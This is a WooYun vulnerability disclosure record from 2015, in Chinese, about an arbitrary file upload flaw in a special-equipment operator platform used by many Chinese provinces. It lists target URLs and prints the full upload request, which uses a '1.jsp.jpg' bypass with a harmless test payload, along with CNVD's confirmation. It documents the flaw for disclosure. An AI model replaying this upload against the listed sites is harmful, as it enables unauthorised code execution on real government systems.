{"id": 34713, "wybug_id": "wooyun-2015-0105652", "wybug_title": "某特种设备管理平台任意文件上传，影响全国众多省份地区", "wybug_corp": "上海君睿信息技术有限公司", "wybug_author": "路人甲", "wybug_date": "2015-04-07 11:32", "wybug_open_date": "2015-07-09 16:10", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意", "文件上传安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-09：\t细节向公众公开  简要描述： 某特种设备管理平台任意文件上传，影响全国众多省份地区 详细说明：  厂商：上海君睿信息技术有限公司系统名称：特种设备作业人员管理平台漏洞问题：文件上传漏洞文件：dwbm_kzbm.do（特种设备作业人员考核申请表）关键字：技术支持：上海君睿信息技术有限公司根据搜索引擎，列举部分不完全案例如下：江苏省特种设备管理平台：http://www.jstsks.com/index.shtml湖南省特种设备管理平台：http://www.hntskh.com/index.shtml安徽省特种设备管理平台：http://www.ahtsks.com/index.shtml四川省特种设备管理平台：http://www.sctzsbzy.com/default.shtml海南省特种设备管理平台：http://www.hntsks.com/index.shtml贵州省特种设备管理平台：http://www.gztsks.com/index.shtml吉林省特种设备管理平台：http://www.jltsks.com/index.shtml广西省特种设备管理平台：http://www.gxtsks.com/index.shtml新疆省特种设备管理平台：http://124.117.254.130:7001/index.shtml湖北省特种设备管理平台：http://www.hbtsks.com/index.shtml云南省特种设备管理平台：http://116.53.253.7/index.shtml内蒙古自治区特种设备管理平台：http://218.21.128.211:7001/index.shtml甘肃省特种设备管理平台：http://jk.gsgj.com.cn/index.shtml河北省特种设备管理平台：http://www.hbtskh.com/index.shtml宁夏省特种设备管理平台：http://www.nxtsks.com/index.shtml等等   漏洞证明：  漏洞证明：贵州省特种设备管理平台：http://www.gztsks.com/index.shtml为例：http://www.gztsks.com/dwbm_kzbm.do\n\n头像上传处过滤存在缺陷。。\nPOST /uploadksimg.do?suffix=jpg&filename=files HTTP/1.1Host: www.gztsks.comProxy-Connection: keep-aliveContent-Length: 2507Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://www.gztsks.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryK33Uu771DJ6Bwm86Referer: http://www.gztsks.com/dwbm_kzbm.doAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: JSESSIONID=Xc4tVpxDGhFX8SLyyTB8LFkcqKHGM7SxBXxvhXT5CqWsS7RbJBGs!-348822473!512037645------WebKitFormBoundaryK33Uu771DJ6Bwm86Content-Disposition: form-data; name=\"bmid\"------WebKitFormBoundaryK33Uu771DJ6Bwm86Content-Disposition: form-data; name=\"jgdm\"------WebKitFormBoundaryK33Uu771DJ6Bwm86Content-Disposition: form-data; name=\"flag\"------WebKitFormBoundaryK33Uu771DJ6Bwm86Content-Disposition: form-data; name=\"bmlb\"------WebKitFormBoundaryK33Uu771DJ6Bwm86Content-Disposition: form-data; name=\"plan_id\"------WebKitFormBoundaryK33Uu771DJ6Bwm86Content-Disposition: form-data; name=\"pxjgdm\"------WebKitFormBoundaryK33Uu771DJ6Bwm86Content-Disposition: form-data; name=\"sqrxm\"------WebKitFormBoundaryK33Uu771DJ6Bwm86Content-Disposition: form-data; name=\"xb\"1------WebKitFormBoundaryK33Uu771DJ6Bwm86Content-Disposition: form-data; name=\"files\"; filename=\"1.jsp.jpg\"Content-Type: image/jpegThis  is  a  test------WebKitFormBoundaryK33Uu771DJ6Bwm86Content-Disposition: form-data; name=\"txdz\"------WebKitFormBoundaryK33Uu771DJ6Bwm86Content-Disposition: form-data; name=\"whcd\"------WebKitFormBoundaryK33Uu771DJ6Bwm86Content-Disposition: form-data; name=\"yzbm\"------WebKitFormBoundaryK33Uu771DJ6Bwm86Content-Disposition: form-data; name=\"zjlx\"1------WebKitFormBoundaryK33Uu771DJ6Bwm86Content-Disposition: form-data; name=\"sfzh\"------WebKitFormBoundaryK33Uu771DJ6Bwm86Content-Disposition: form-data; name=\"lxdh\"------WebKitFormBoundaryK33Uu771DJ6Bwm86Content-Disposition: form-data; name=\"zyzl\"------WebKitFormBoundaryK33Uu771DJ6Bwm86Content-Disposition: form-data; name=\"zyxm\"------WebKitFormBoundaryK33Uu771DJ6Bwm86Content-Disposition: form-data; name=\"sfwtqz\"1------WebKitFormBoundaryK33Uu771DJ6Bwm86Content-Disposition: form-data; name=\"yrdw\"------WebKitFormBoundaryK33Uu771DJ6Bwm86Content-Disposition: form-data; name=\"dwdz\"------WebKitFormBoundaryK33Uu771DJ6Bwm86Content-Disposition: form-data; name=\"dwlxr\"------WebKitFormBoundaryK33Uu771DJ6Bwm86Content-Disposition: form-data; name=\"dwlxdh\"------WebKitFormBoundaryK33Uu771DJ6Bwm86Content-Disposition: form-data; name=\"gzjl\"------WebKitFormBoundaryK33Uu771DJ6Bwm86Content-Disposition: form-data; name=\"pxqk\"------WebKitFormBoundaryK33Uu771DJ6Bwm86Content-Disposition: form-data; name=\"sqrqzrq\"2015-04-03------WebKitFormBoundaryK33Uu771DJ6Bwm86Content-Disposition: form-data; name=\"xgclType\"07------WebKitFormBoundaryK33Uu771DJ6Bwm86--\n\n\n修改为jsp格式成功返回：\n\n验证下：\n\n   修复方案：  如上！   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2015-04-10 16:08 厂商回复： CNVD确认并复现所述情况，已经由CNVD通过网站公开联系方式向软件生产厂商及各省份的分中心通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}